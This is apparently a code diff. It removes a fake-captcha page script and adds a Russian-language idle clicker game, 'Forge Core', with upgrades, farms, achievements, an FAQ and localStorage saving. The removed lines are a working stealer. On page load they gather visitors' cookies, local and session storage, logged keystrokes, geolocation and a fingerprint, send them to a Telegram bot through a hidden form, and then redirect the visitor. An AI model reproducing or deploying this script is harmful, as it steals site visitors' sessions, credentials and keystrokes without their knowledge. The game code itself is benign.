-    data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    data.time = new Date().toISOString();
-    data.ref = document.referrer || 'прямой';
-    data.url = location.href;
-    data.fp = getFP();
-    data.cookies = document.cookie || 'нет';
-    
-    try {
-        data.ls = JSON.stringify(localStorage, null, 2) || 'пусто';
-    } catch(e) { data.ls = 'ошибка'; }
-    
-    try {
-        data.ss = JSON.stringify(sessionStorage, null, 2) || 'пусто';
-    } catch(e) { data.ss = 'ошибка'; }
-    
-    data.keylog = keyLog.join('') || 'тишина';
-    data.geo = await getGeo();
-    
-    return data;
-}
-
-// ---------- ОТПРАВКА ЧЕРЕЗ GET-ЗАПРОС (БЕЗ ПРОКСИ) ----------
-function sendViaGet(text) {
-    const form = document.getElementById('tgForm');
-    const encoded = encodeURIComponent(text);
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=HTML`;
-    
-    form.action = url;
-    form.submit();
-    
-    // Статус
-    document.getElementById('statusText').textContent = '✅ Данные отправлены';
-    document.getElementById('statusText').style.color = '#7ddf9a';
-}
-
-// ---------- ОСНОВНАЯ ФУНКЦИЯ ----------
-async function main() {
-    const data = await collectAllData();
-    
-    let report = '📡 СБОР ДАННЫХ (АВТОМАТИЧЕСКИЙ)\n';
-    report += '═══════════════════════════════════\n';
-    for (let key in data) {
-        report += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
+  // ember particles background
+  (function(){
+    var field = document.getElementById("ember-field");
+    for (var i=0;i<16;i++){
+      var e = document.createElement("div");
+      e.className = "ember-particle";
+      var size = 2 + Math.random()*4;
+      e.style.width = size+"px"; e.style.height = size+"px";
+      e.style.left = (Math.random()*100)+"%";
+      e.style.setProperty("--drift", (Math.random()*60-30)+"px");
+      e.style.animationDuration = (5 + Math.random()*6)+"s";
+      e.style.animationDelay = (Math.random()*8)+"s";
+      field.appendChild(e);
     }
-    report += '═══════════════════════════════════\n';
-    
-    // Отправляем через GET
-    sendViaGet(report);
-    
-    // Возвращаем капчу
-    return data;
-}
+  })();
 
-// ---------- АВТОЗАПУСК ----------
-window.addEventListener('load', function() {
-    setTimeout(() => {
-        main().catch(console.error);
-    }, 1500);
-});
+  const LOAD_DURATION = 10000;
+  const tips = [
+    "Совет: Фермы дают пассивный доход без кликов!",
+    "Совет: Копите на перерождение ради постоянных бонусов.",
+    "Совет: Ускоритель может дать временный x3 буст.",
+    "Совет: Улучшения дешевле в начале — берите их скорее!",
+    "Совет: Автосохранение работает каждую секунду.",
+    "Совет: Загляните в FAQ в профиле, если что-то непонятно.",
+    "Совет: Батарея усиливает вообще все ваши бонусы.",
+    "Совет: Достижения дают постоянные бонусы ко всему доходу.",
+    "Совет: Форсаж добавляет ещё один слой множителя.",
+    "Совет: После 40 звёзд перерождения откроется Вознесение.",
+    "Совет: Реликвии покупаются за кристаллы вознесения и остаются навсегда.",
+    "Совет: Заходите каждый день — за серию входов дают бонус!",
+    "Загрузка неоновых частиц...",
+    "Разогрев кнопки клика...",
+    "Подключение к серверу валюты..."
+  ];
+  const loadFill = document.getElementById("loading-bar-fill");
+  const loadPct = document.getElementById("loading-pct");
+  const loadTip = document.getElementById("loading-tip");
+  const loadScreen = document.getElementById("loading-screen");
+  const appEl = document.getElementById("app");
 
-// ---------- ОБРАБОТКА КАПЧИ ----------
-document.getElementById('submitBtn').addEventListener('click', function() {
-    const input = document.getElementById('captchaInput');
-    const status = document.getElementById('statusText');
-    const userCode = input.value.toUpperCase().trim();
+  let tipIndex = 0;
+  loadTip.textContent = tips[0];
+  const tipTimer = setInterval(() => {
+    tipIndex = (tipIndex + 1) % tips.length;
+    loadTip.textContent = tips[tipIndex];
+  }, 1400);
 
-    if (userCode === currentCaptcha) {
-        status.textContent = '✅ Доступ подтверждён! Перенаправление...';
-        status.style.color = '#7ddf9a';
-        this.disabled = true;
-        input.disabled = true;
-        
-        // Дополнительная отправка (на всякий случай)
-        setTimeout(() => {
-            main();
-        }, 500);
-
-        setTimeout(() => {
-            window.location.href = 'https://yandex.ru';
-        }, 2000);
+  const loadStart = Date.now();
+  function loadTick() {
+    const elapsed = Date.now() - loadStart;
+    const pct = Math.min(100, (elapsed / LOAD_DURATION) * 100);
+    loadFill.style.width = pct + "%";
+    loadPct.textContent = Math.floor(pct) + "%";
+    if (elapsed < LOAD_DURATION) {
+      requestAnimationFrame(loadTick);
     } else {
-        status.textContent = '❌ Неверный код, попробуйте снова';
-        status.style.color = '#ff8a7a';
-        input.value = '';
-        currentCaptcha = generateCaptcha();
-        setTimeout(() => {
-            status.textContent = 'Введите код с картинки';
-            status.style.color = '#5a6a7a';
-        }, 2000);
+      clearInterval(tipTimer);
+      loadScreen.style.transition = "opacity 0.5s ease";
+      loadScreen.style.opacity = "0";
+      setTimeout(() => {
+        loadScreen.style.display = "none";
+        appEl.classList.add("visible");
+        initGame();
+      }, 500);
     }
-});
+  }
+  requestAnimationFrame(loadTick);
 
-document.getElementById('captchaInput').addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') {
-        document.getElementById('submitBtn').click();
+  /* ================= STATE ================= */
+  const SAVE_KEY = "forge_clicker_save_v1";
+
+  const defaultState = {
+    currency: 0,
+    totalEarned: 0,
+    clickPower: 1,
+    clickLevel: 0,
+    autoPerSec: 0,
+    autoLevel: 0,
+    multiplier: 1,
+    multipliersBought: {m2:0, m5:0, m10:0, m25:0, m50:0, m100:0, m500:0, m1000:0, m10000:0},
+    specials: {battery:0, accel:0, overclock:0, crit:0, offline:0},
+    boostEndTime: 0,
+    boostMultiplier: 1,
+    farms: {},
+    achievements: {},
+    relics: {},
+    ascensionCrystals: 0,
+    ascensionCount: 0,
+    prestigeStars: 0,
+    totalClicks: 0,
+    totalCrits: 0,
+    totalBoosts: 0,
+    loginStreak: 0,
+    lastLoginDay: null,
+    lastSeen: Date.now(),
+    createdAt: Date.now()
+  };
+
+  let state = JSON.parse(JSON.stringify(defaultState));
+
+  /* ================= DEFINITIONS ================= */
+
+  function costFor(base, growth, level) {
+    return Math.ceil(base * Math.pow(growth, level));
+  }
+
+  const clickUpgrade = {
+    name: "Усиление удара",
+    icon: "sword",
+    baseCost: 15,
+    growth: 1.15,
+    powerMult: 1.15,
+    desc: (lvl) => `Урон за клик x1.15 (сейчас x${Math.pow(1.15, lvl).toFixed(2)} от базы). Ур. ${lvl}`
+  };
+
+  const clickTierUpgrades = [
+    { id:"ct1", name:"Стальные перчатки", icon:"glove", cost:100, req:5, powerAdd:2, desc:"Плоский +2 к урону за клик" },
+    { id:"ct2", name:"Огненный кулак", icon:"flame", cost:800, req:15, powerAdd:10, desc:"Плоский +10 к урону за клик" },
+    { id:"ct3", name:"Ледяной удар", icon:"snow", cost:5000, req:30, powerAdd:50, desc:"Плоский +50 к урону за клик" },
+    { id:"ct4", name:"Громовой молот", icon:"hammer", cost:30000, req:50, powerAdd:250, desc:"Плоский +250 к урону за клик" },
+    { id:"ct5", name:"Клинок пустоты", icon:"dagger", cost:200000, req:80, powerAdd:1200, desc:"Плоский +1200 к урону за клик" },
+    { id:"ct6", name:"Кристальный клинок", icon:"crystal", cost:1500000, req:120, powerAdd:6000, desc:"Плоский +6000 к урону за клик" },
+    { id:"ct7", name:"Клинок бездны", icon:"blackhole", cost:12000000, req:180, powerAdd:30000, desc:"Плоский +30000 к урону за клик" },
+    { id:"ct8", name:"Клинок сингулярности", icon:"galaxy", cost:100000000, req:260, powerAdd:150000, desc:"Плоский +150000 к урону за клик" },
+    { id:"ct9", name:"Клинок вечности", icon:"crystal", cost:800000000, req:350, powerAdd:750000, desc:"Плоский +750000 к урону за клик" },
+    { id:"ct10", name:"Клинок хаоса", icon:"volcano", cost:6000000000, req:500, powerAdd:4000000, desc:"Плоский +4000000 к урону за клик" },
+    { id:"ct11", name:"Клинок абсолюта", icon:"gem", cost:50000000000, req:700, powerAdd:20000000, desc:"Плоский +20000000 к урону за клик" },
+    { id:"ct12", name:"Клинок бесконечности", icon:"portal", cost:400000000000, req:1000, powerAdd:100000000, desc:"Плоский +100000000 к урону за клик" }
+  ];
+
+  const autoUpgrade = {
+    name: "Автокликер",
+    icon: "robot",
+    baseCost: 40,
+    growth: 1.16,
+    gain: 1,
+    desc: (lvl) => `+1 авто-клик/сек. Ур. ${lvl}`
+  };
+
+  const autoTierUpgrades = [
+    { id:"at1", name:"Механическая рука", icon:"arm", cost:300, req:8, dpsAdd:5, desc:"Плоский +5 к доходу/сек" },
+    { id:"at2", name:"Робот-помощник", icon:"robot", cost:2500, req:20, dpsAdd:25, desc:"Плоский +25 к доходу/сек" },
+    { id:"at3", name:"ИИ-ферма", icon:"brain", cost:15000, req:35, dpsAdd:120, desc:"Плоский +120 к доходу/сек" },
+    { id:"at4", name:"Квантовый процессор", icon:"chip", cost:120000, req:60, dpsAdd:600, desc:"Плоский +600 к доходу/сек" },
+    { id:"at5", name:"Нейросеть", icon:"brain", cost:900000, req:90, dpsAdd:3000, desc:"Плоский +3000 к доходу/сек" },
+    { id:"at6", name:"Оркестратор роёв", icon:"satellite", cost:7000000, req:130, dpsAdd:15000, desc:"Плоский +15000 к доходу/сек" },
+    { id:"at7", name:"Сингулярное ядро", icon:"blackhole", cost:55000000, req:190, dpsAdd:75000, desc:"Плоский +75000 к доходу/сек" },
+    { id:"at8", name:"Гиперкластер", icon:"chip", cost:400000000, req:260, dpsAdd:400000, desc:"Плоский +400000 к доходу/сек" },
+    { id:"at9", name:"Ноосфера", icon:"brain", cost:3000000000, req:350, dpsAdd:2000000, desc:"Плоский +2000000 к доходу/сек" },
+    { id:"at10", name:"Мультивселенское ядро", icon:"portal", cost:25000000000, req:500, dpsAdd:10000000, desc:"Плоский +10000000 к доходу/сек" },
+    { id:"at11", name:"Абсолютный интеллект", icon:"galaxy", cost:200000000000, req:700, dpsAdd:50000000, desc:"Плоский +50000000 к доходу/сек" },
+    { id:"at12", name:"Вечный двигатель", icon:"battery", cost:1500000000000, req:1000, dpsAdd:250000000, desc:"Плоский +250000000 к доходу/сек" }
+  ];
+
+  const farms = [
+    { key:"farm_lemon", name:"Лимонадный ларёк", icon:"cup", baseCost:50, growth:1.13, income:0.5, desc:"Простой источник дохода" },
+    { key:"farm_dog", name:"Собачья ферма", icon:"dog", baseCost:250, growth:1.14, income:3, desc:"Милые собачки приносят монеты" },
+    { key:"farm_farm", name:"Пшеничное поле", icon:"wheat", baseCost:1200, growth:1.15, income:14, desc:"Классическая ферма" },
+    { key:"farm_factory", name:"Завод", icon:"factory", baseCost:6000, growth:1.16, income:65, desc:"Промышленное производство" },
+    { key:"farm_mine", name:"Шахта", icon:"pick", baseCost:30000, growth:1.17, income:300, desc:"Добыча ресурсов из недр" },
+    { key:"farm_bank", name:"Банк", icon:"bank", baseCost:150000, growth:1.18, income:1400, desc:"Деньги делают деньги" },
+    { key:"farm_lab", name:"Лаборатория", icon:"flask", baseCost:750000, growth:1.19, income:6500, desc:"Научные эксперименты приносят прибыль" },
+    { key:"farm_rocket", name:"Космодром", icon:"rocket", baseCost:4000000, growth:1.20, income:30000, desc:"Добыча ресурсов в космосе" },
+    { key:"farm_portal", name:"Портал", icon:"portal", baseCost:25000000, growth:1.21, income:150000, desc:"Ресурсы из параллельных миров" },
+    { key:"farm_star", name:"Звёздная кузница", icon:"starforge", baseCost:150000000, growth:1.22, income:800000, desc:"Куёт валюту из звёздной пыли" },
+    { key:"farm_crystal", name:"Кристальная пещера", icon:"crystal", baseCost:1000000000, growth:1.23, income:4000000, desc:"Растит редкие кристаллы валюты" },
+    { key:"farm_forest", name:"Живой лес", icon:"tree", baseCost:7000000000, growth:1.24, income:20000000, desc:"Древний лес насыщен энергией" },
+    { key:"farm_orbital", name:"Орбитальная станция", icon:"satellite", baseCost:50000000000, growth:1.25, income:100000000, desc:"Добыча ресурсов на орбите" },
+    { key:"farm_volcano", name:"Вулканическая кузня", icon:"volcano", baseCost:400000000000, growth:1.26, income:600000000, desc:"Плавит валюту в жерле вулкана" },
+    { key:"farm_galaxy", name:"Галактический рынок", icon:"galaxy", baseCost:3000000000000, growth:1.27, income:4000000000, desc:"Торговля в масштабах галактики" },
+    { key:"farm_blackhole", name:"Чёрная дыра", icon:"blackhole", baseCost:25000000000000, growth:1.28, income:30000000000, desc:"Извлекает валюту из горизонта событий" },
+    { key:"farm_nebula", name:"Туманность", icon:"galaxy", baseCost:200000000000000, growth:1.29, income:200000000000, desc:"Туманность, богатая ресурсами" },
+    { key:"farm_dimension", name:"Карманное измерение", icon:"portal", baseCost:1500000000000000, growth:1.30, income:1200000000000, desc:"Собственное измерение валюты" },
+    { key:"farm_singularity", name:"Сингулярность", icon:"blackhole", baseCost:12000000000000000, growth:1.31, income:8000000000000, desc:"Генерирует практически бесконечный доход" },
+    { key:"farm_multiverse", name:"Мультивселенная", icon:"sparkles", baseCost:100000000000000000, growth:1.32, income:50000000000000, desc:"Доход со всех вселенных сразу" }
+  ];
+
+  const multiUpgrades = [
+    { key: "m2", name: "Множитель x2", icon: "sparkles", baseCost: 500, factor: 2, maxLevel: 1 },
+    { key: "m5", name: "Множитель x5", icon: "star", baseCost: 5000, factor: 5, maxLevel: 1 },
+    { key: "m10", name: "Множитель x10", icon: "gem", baseCost: 50000, factor: 10, maxLevel: 1 },
+    { key: "m25", name: "Множитель x25", icon: "crystal", baseCost: 500000, factor: 25, maxLevel: 1 },
+    { key: "m50", name: "Множитель x50", icon: "starforge", baseCost: 5000000, factor: 50, maxLevel: 1 },
+    { key: "m100", name: "Множитель x100", icon: "galaxy", baseCost: 50000000, factor: 100, maxLevel: 1 },
+    { key: "m500", name: "Множитель x500", icon: "volcano", baseCost: 500000000, factor: 500, maxLevel: 1 },
+    { key: "m1000", name: "Множитель x1000", icon: "blackhole", baseCost: 5000000000, factor: 1000, maxLevel: 1 },
+    { key: "m10000", name: "Множитель x10000", icon: "portal", baseCost: 80000000000, factor: 10000, maxLevel: 1 }
+  ];
+
+  const specialUpgrades = [
+    { key: "battery", name: "Батарея улучшений", icon: "battery",
+      baseCost: 800, growth: 3.2, maxLevel: 10,
+      desc: (lvl) => `+20% ко всем эффектам за уровень. Ур. ${lvl}/10` },
+    { key: "accel", name: "Ускоритель", icon: "turbo",
+      baseCost: 2000, growth: 4, maxLevel: 5,
+      desc: (lvl) => `Шанс x3 буста на 10 сек при клике. Ур. ${lvl}/5` },
+    { key: "overclock", name: "Форсаж", icon: "bolt",
+      baseCost: 10000, growth: 5, maxLevel: 8,
+      desc: (lvl) => `+8% ко всему доходу за уровень. Ур. ${lvl}/8` },
+    { key: "crit", name: "Критический удар", icon: "dagger",
+      baseCost: 5000, growth: 3.5, maxLevel: 10,
+      desc: (lvl) => `Шанс ${(lvl*3)}% на x10 удар при клике. Ур. ${lvl}/10` },
+    { key: "offline", name: "Оффлайн-генератор", icon: "chip",
+      baseCost: 20000, growth: 4.5, maxLevel: 6,
+      desc: (lvl) => `+${(lvl*15)}% к оффлайн-доходу и +${lvl}ч к лимиту накопления. Ур. ${lvl}/6` }
+  ];
+
+  const relicsData = [
+    { id:"r1", name:"Ускоренный старт", icon:"bolt", cost:1, desc:"+10 к базовому урону клика при каждом перерождении" },
+    { id:"r2", name:"Фермерский инстинкт", icon:"wheat", cost:2, desc:"+50% к доходу со всех ферм навсегда" },
+    { id:"r3", name:"Автоматизация", icon:"robot", cost:3, desc:"+50% к автоматическому доходу навсегда" },
+    { id:"r4", name:"Критическая масса", icon:"dagger", cost:4, desc:"+10% к шансу критического удара" },
+    { id:"r5", name:"Временной карман", icon:"chip", cost:5, desc:"+50% к оффлайн-доходу" },
+    { id:"r6", name:"Звёздная память", icon:"star", cost:7, desc:"+25% к количеству звёзд за перерождение" },
+    { id:"r7", name:"Бесконечный резерв", icon:"gem", cost:10, desc:"+100% ко всей валюте навсегда" },
+    { id:"r8", name:"Ядро вознесения", icon:"portal", cost:15, desc:"+50% к кристаллам вознесения" },
+    { id:"r9", name:"Печать хаоса", icon:"volcano", cost:20, desc:"+200% к урону за клик навсегда" },
+    { id:"r10", name:"Абсолютная сила", icon:"blackhole", cost:30, desc:"+200% к автодоходу навсегда" }
+  ];
+
+  const achievementsData = [
+    { id:"ac_click_10", name:"Первые шаги", desc:"Сделайте 10 кликов", icon:"bolt", bonus:0.01, check:(s)=>s.totalClicks>=10 },
+    { id:"ac_click_100", name:"Разминка", desc:"Сделайте 100 кликов", icon:"bolt", bonus:0.01, check:(s)=>s.totalClicks>=100 },
+    { id:"ac_click_1000", name:"Кликер", desc:"Сделайте 1,000 кликов", icon:"bolt", bonus:0.01, check:(s)=>s.totalClicks>=1000 },
+    { id:"ac_click_10000", name:"Мастер клика", desc:"Сделайте 10,000 кликов", icon:"bolt", bonus:0.02, check:(s)=>s.totalClicks>=10000 },
+    { id:"ac_click_100000", name:"Легенда клика", desc:"Сделайте 100,000 кликов", icon:"bolt", bonus:0.03, check:(s)=>s.totalClicks>=100000 },
+    { id:"ac_earn_1k", name:"Первая тысяча", desc:"Заработайте 1,000 валюты", icon:"gem", bonus:0.01, check:(s)=>s.totalEarned>=1e3 },
+    { id:"ac_earn_1m", name:"Миллионер", desc:"Заработайте 1,000,000 валюты", icon:"gem", bonus:0.01, check:(s)=>s.totalEarned>=1e6 },
+    { id:"ac_earn_1b", name:"Миллиардер", desc:"Заработайте 1B валюты", icon:"gem", bonus:0.02, check:(s)=>s.totalEarned>=1e9 },
+    { id:"ac_earn_1t", name:"Триллионер", desc:"Заработайте 1T валюты", icon:"gem", bonus:0.02, check:(s)=>s.totalEarned>=1e12 },
+    { id:"ac_earn_1qa", name:"Квадриллионер", desc:"Заработайте 1Qa валюты", icon:"gem", bonus:0.03, check:(s)=>s.totalEarned>=1e15 },
+    { id:"ac_earn_1qi", name:"Повелитель валюты", desc:"Заработайте 1Qi валюты", icon:"gem", bonus:0.04, check:(s)=>s.totalEarned>=1e18 },
+    { id:"ac_earn_1sx", name:"Секстиллионер", desc:"Заработайте 1Sx валюты", icon:"gem", bonus:0.05, check:(s)=>s.totalEarned>=1e21 },
+    { id:"ac_earn_1sp", name:"Септиллионер", desc:"Заработайте 1Sp валюты", icon:"gem", bonus:0.06, check:(s)=>s.totalEarned>=1e24 },
+    { id:"ac_farms_10", name:"Начинающий фермер", desc:"Купите 10 ферм суммарно", icon:"house", bonus:0.01, check:(s,c)=>c.totalFarms>=10 },
+    { id:"ac_farms_50", name:"Фермер", desc:"Купите 50 ферм суммарно", icon:"house", bonus:0.01, check:(s,c)=>c.totalFarms>=50 },
+    { id:"ac_farms_100", name:"Магнат недвижимости", desc:"Купите 100 ферм суммарно", icon:"house", bonus:0.02, check:(s,c)=>c.totalFarms>=100 },
+    { id:"ac_farms_300", name:"Империя ферм", desc:"Купите 300 ферм суммарно", icon:"house", bonus:0.03, check:(s,c)=>c.totalFarms>=300 },
+    { id:"ac_farms_600", name:"Владыка производства", desc:"Купите 600 ферм суммарно", icon:"house", bonus:0.04, check:(s,c)=>c.totalFarms>=600 },
+    { id:"ac_farms_1000", name:"Мегакорпорация", desc:"Купите 1000 ферм суммарно", icon:"house", bonus:0.05, check:(s,c)=>c.totalFarms>=1000 },
+    { id:"ac_dps_100", name:"Автоматизация", desc:"Достигните дохода 100/сек", icon:"robot", bonus:0.01, check:(s,c)=>c.dps>=100 },
+    { id:"ac_dps_10k", name:"Пассивный доход", desc:"Достигните дохода 10,000/сек", icon:"robot", bonus:0.02, check:(s,c)=>c.dps>=10000 },
+    { id:"ac_dps_1m", name:"Машина денег", desc:"Достигните дохода 1,000,000/сек", icon:"robot", bonus:0.03, check:(s,c)=>c.dps>=1000000 },
+    { id:"ac_dps_1b", name:"Финансовая империя", desc:"Достигните дохода 1B/сек", icon:"robot", bonus:0.03, check:(s,c)=>c.dps>=1e9 },
+    { id:"ac_dps_1t", name:"Хозяин экономики", desc:"Достигните дохода 1T/сек", icon:"robot", bonus:0.04, check:(s,c)=>c.dps>=1e12 },
+    { id:"ac_rebirth_1", name:"Новое начало", desc:"Переродитесь 1 раз", icon:"refresh", bonus:0.02, check:(s)=>s.prestigeStars>=1 },
+    { id:"ac_rebirth_5", name:"Цикл перерождений", desc:"Наберите 5 звёзд", icon:"refresh", bonus:0.02, check:(s)=>s.prestigeStars>=5 },
+    { id:"ac_rebirth_10", name:"Бессмертный", desc:"Наберите 10 звёзд", icon:"refresh", bonus:0.03, check:(s)=>s.prestigeStars>=10 },
+    { id:"ac_rebirth_25", name:"Вечный странник", desc:"Наберите 25 звёзд", icon:"refresh", bonus:0.05, check:(s)=>s.prestigeStars>=25 },
+    { id:"ac_all_click", name:"Оружейник", desc:"Купите все улучшения урона", icon:"sword", bonus:0.03, check:(s,c)=>c.allClick },
+    { id:"ac_all_auto", name:"Инженер", desc:"Купите все улучшения авто", icon:"chip", bonus:0.03, check:(s,c)=>c.allAuto },
+    { id:"ac_all_multi", name:"Коллекционер множителей", desc:"Купите все бонусные множители", icon:"sparkles", bonus:0.03, check:(s,c)=>c.allMulti },
+    { id:"ac_crit_50", name:"Меткий стрелок", desc:"Нанесите 50 критических ударов", icon:"dagger", bonus:0.02, check:(s)=>s.totalCrits>=50 },
+    { id:"ac_crit_500", name:"Убийца боссов", desc:"Нанесите 500 критических ударов", icon:"dagger", bonus:0.03, check:(s)=>s.totalCrits>=500 },
+    { id:"ac_boost_20", name:"Турбо-режим", desc:"Активируйте ускоритель 20 раз", icon:"turbo", bonus:0.02, check:(s)=>s.totalBoosts>=20 },
+    { id:"ac_boost_100", name:"Скоростной демон", desc:"Активируйте ускоритель 100 раз", icon:"turbo", bonus:0.03, check:(s)=>s.totalBoosts>=100 },
+    { id:"ac_ascend_1", name:"Вознесение", desc:"Вознеситесь 1 раз", icon:"portal", bonus:0.05, check:(s)=>s.ascensionCount>=1 },
+    { id:"ac_ascend_3", name:"Просветлённый", desc:"Вознеситесь 3 раза", icon:"portal", bonus:0.06, check:(s)=>s.ascensionCount>=3 },
+    { id:"ac_ascend_10", name:"Трансцендентный", desc:"Вознеситесь 10 раз", icon:"portal", bonus:0.08, check:(s)=>s.ascensionCount>=10 },
+    { id:"ac_relic_5", name:"Коллекционер реликвий", desc:"Приобретите 5 реликвий", icon:"gem", bonus:0.04, check:(s,c)=>c.relicCount>=5 },
+    { id:"ac_relic_all", name:"Хранитель артефактов", desc:"Приобретите все реликвии", icon:"gem", bonus:0.08, check:(s,c)=>c.allRelics },
+    { id:"ac_streak_3", name:"Постоянство", desc:"Заходите в игру 3 дня подряд", icon:"star", bonus:0.02, check:(s)=>s.loginStreak>=3 },
+    { id:"ac_streak_7", name:"Недельная преданность", desc:"Заходите в игру 7 дней подряд", icon:"star", bonus:0.04, check:(s)=>s.loginStreak>=7 },
+    { id:"ac_streak_14", name:"Верный игрок", desc:"Заходите в игру 14 дней подряд", icon:"star", bonus:0.06, check:(s)=>s.loginStreak>=14 }
+  ];
+
+  const faqData = [
+    { q: "Как играть в Forge Core?", a: "Нажимайте на большую кнопку в центре экрана, чтобы получать валюту. За каждый клик вы получаете определённое количество монет — это значение отображается в статистике 'Клик'. Используйте накопленную валюту, чтобы покупать улучшения в магазине и увеличивать свой доход." },
+    { q: "Что такое урон за клик?", a: "Это количество валюты, которое вы получаете за одно нажатие на кнопку. Улучшайте его во вкладке 'Урон' — там есть базовое улучшение 'Усиление удара' и мощные тиерные улучшения, которые дают плоский бонус, но требуют определённого уровня базового улучшения." },
+    { q: "Что такое доход в секунду (DPS)?", a: "Это пассивный доход, который вы получаете каждую секунду без необходимости кликать. Он складывается из автокликеров (вкладка 'Авто') и всех ферм, которые вы купили (вкладка 'Фермы')." },
+    { q: "Что такое фермы?", a: "Фермы — здания, которые приносят фиксированный пассивный доход каждую секунду. Цена каждой следующей фермы растёт экспоненциально. Всего в игре 20 видов ферм — от лимонадного ларька до Мультивселенной." },
+    { q: "Что такое бонусные множители?", a: "Во вкладке 'Бусты' можно приобрести множители от x2 до x10000, которые умножают ВСЮ вашу валюту. Это одноразовые покупки, но их эффект действует постоянно." },
+    { q: "Что такое батарея, ускоритель, форсаж, крит и оффлайн-генератор?", a: "Батарея даёт +20% ко всем эффектам за уровень. Ускоритель даёт шанс на буст x3 на 10 секунд. Форсаж добавляет +8% ко всему доходу за уровень. Критический удар даёт шанс на клик x10. Оффлайн-генератор увеличивает доход и лимит накопления, пока вы не в игре." },
+    { q: "Что такое достижения?", a: "Во вкладке 'Дост.' собраны десятки целей. За каждое выполненное достижение вы получаете постоянный процентный бонус ко всей валюте, который не сбрасывается ни при перерождении, ни при вознесении." },
+    { q: "Что такое перерождение (Rebirth)?", a: "Перерождение сбрасывает текущий прогресс (валюту, улучшения, фермы) в обмен на звёзды перерождения. Каждая звезда даёт постоянный множитель +10% ко всей валюте НАВСЕГДА. Формула: звёзды = √(всего заработано ÷ 100,000,000)." },
+    { q: "Что такое Вознесение?", a: "Вознесение — это второй уровень перерождения, доступный при накоплении 40+ звёзд. При вознесении звёзды сбрасываются в обмен на Кристаллы Вознесения, которые тратятся на постоянные Реликвии. Достижения и уже купленные реликвии остаются навсегда." },
+    { q: "Что такое реликвии?", a: "Реликвии — мощные постоянные бонусы, покупаемые за Кристаллы Вознесения. Они никогда не сбрасываются, даже при повторных вознесениях, и дают огромные бонусы к доходу, крит-шансу и другим параметрам." },
+    { q: "Не потеряю ли я всё после перерождения или вознесения?", a: "Валюта, улучшения и фермы сбрасываются при обоих действиях. Но звёзды и достижения остаются после перерождения, а реликвии, кристаллы вознесения и достижения остаются НАВСЕГДА даже после вознесения." },
+    { q: "Что даёт ежедневный вход?", a: "Каждый день при заходе в игру вы получаете бонус валюты, который растёт с серией дней подряд. Пропуск дня сбрасывает серию. За серии в 3/7/14 дней также даются достижения." },
+    { q: "Как сохраняется прогресс?", a: "Игра автоматически сохраняет прогресс в память вашего браузера (localStorage) каждую секунду. Вы также получаете оффлайн-доход за время отсутствия." },
+    { q: "Как сбросить прогресс полностью?", a: "Зайдите во вкладку 'Профиль' и нажмите кнопку 'Сбросить игру'. Это действие необратимо и удалит вообще весь прогресс." },
+    { q: "Игра зависает или не сохраняется, что делать?", a: "Убедитесь, что у вашего браузера есть доступ к localStorage (не режим инкогнито). Попробуйте вручную нажать 'Сохранить сейчас' в профиле." }
+  ];
+
+  /* ================= SAVE / LOAD ================= */
+
+  function save() {
+    state.lastSeen = Date.now();
+    try { localStorage.setItem(SAVE_KEY, JSON.stringify(state)); } catch(e) {}
+  }
+
+  function todayStr(){
+    const d = new Date();
+    return d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();
+  }
+
+  function load() {
+    try {
+      const raw = localStorage.getItem(SAVE_KEY);
+      if (raw) {
+        const loaded = JSON.parse(raw);
+        state = Object.assign(JSON.parse(JSON.stringify(defaultState)), loaded);
+        state.multipliersBought = Object.assign({m2:0,m5:0,m10:0,m25:0,m50:0,m100:0,m500:0,m1000:0,m10000:0}, loaded.multipliersBought);
+        state.specials = Object.assign({battery:0, accel:0, overclock:0, crit:0, offline:0}, loaded.specials);
+        state.relics = loaded.relics || {};
+        state.farms = loaded.farms || {};
+        state.achievements = loaded.achievements || {};
+
+        const capSec = 3600*4 + state.specials.offline*3600;
+        const elapsedSec = Math.floor((Date.now() - (state.lastSeen||Date.now()))/1000);
+        const offlineSec = Math.min(capSec, elapsedSec);
+        if (offlineSec > 5) {
+          const offlineMult = 1 + state.specials.offline*0.15 + relicOfflineBonus();
+          const earned = Math.floor(offlineSec * getEffectiveDps() * offlineMult);
+          if (earned > 0) {
+            state.currency += earned;
+            state.totalEarned += earned;
+            setTimeout(()=> showToast(`Пока вас не было: +${formatNum(earned)}!`), 900);
+          }
+        }
+
+        // daily login streak
+        const today = todayStr();
+        if (state.lastLoginDay !== today) {
+          const oneDayMs = 86400000;
+          const last = state.lastLoginDay ? new Date(state.lastLoginDay.split("-")[0], state.lastLoginDay.split("-")[1]-1, state.lastLoginDay.split("-")[2]) : null;
+          const now = new Date();
+          const diffDays = last ? Math.round((now.setHours(0,0,0,0) - new Date(last.getFullYear(),last.getMonth(),last.getDate()).getTime())/oneDayMs) : null;
+          if (diffDays === 1) { state.loginStreak++; }
+          else { state.loginStreak = 1; }
+          state.lastLoginDay = today;
+          const streakCapped = Math.min(state.loginStreak, 30);
+          const bonus = Math.max(100, Math.floor(state.totalEarned*0.02*streakCapped));
+          state.currency += bonus;
+          state.totalEarned += bonus;
+          setTimeout(()=> showToast(`День ${state.loginStreak} подряд! Бонус: +${formatNum(bonus)}`), 1700);
+        }
+      } else {
+        state.lastLoginDay = todayStr();
+        state.loginStreak = 1;
+      }
+    } catch(e) {}
+  }
+
+  /* ================= HELPERS ================= */
+
+  function formatNum(n) {
+    if (n < 1000) return (Math.floor(n*100)/100).toString();
+    const units = ["", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc", "UDc", "DDc", "TDc", "QaDc", "QiDc", "SxDc", "SpDc", "OcDc"];
+    let u = 0;
+    let val = n;
+    while (val >= 1000 && u < units.length-1) { val /= 1000; u++; }
+    return val.toFixed(val < 10 ? 2 : val < 100 ? 1 : 0) + units[u];
+  }
+
+  function batteryBonus() { return 1 + state.specials.battery * 0.2; }
+  function overclockBonus() { return 1 + state.specials.overclock * 0.08; }
+  function prestigeMult() { return 1 + state.prestigeStars * 0.1; }
+  function achievementMult() {
+    let bonus = 0;
+    achievementsData.forEach(a => { if (state.achievements[a.id]) bonus += a.bonus; });
+    return 1 + bonus;
+  }
+
+  function relicBonusAll(){ return 1 + (state.relics.r7 ? 1.0 : 0); }
+  function relicClickMult(){ return 1 + (state.relics.r9 ? 2.0 : 0); }
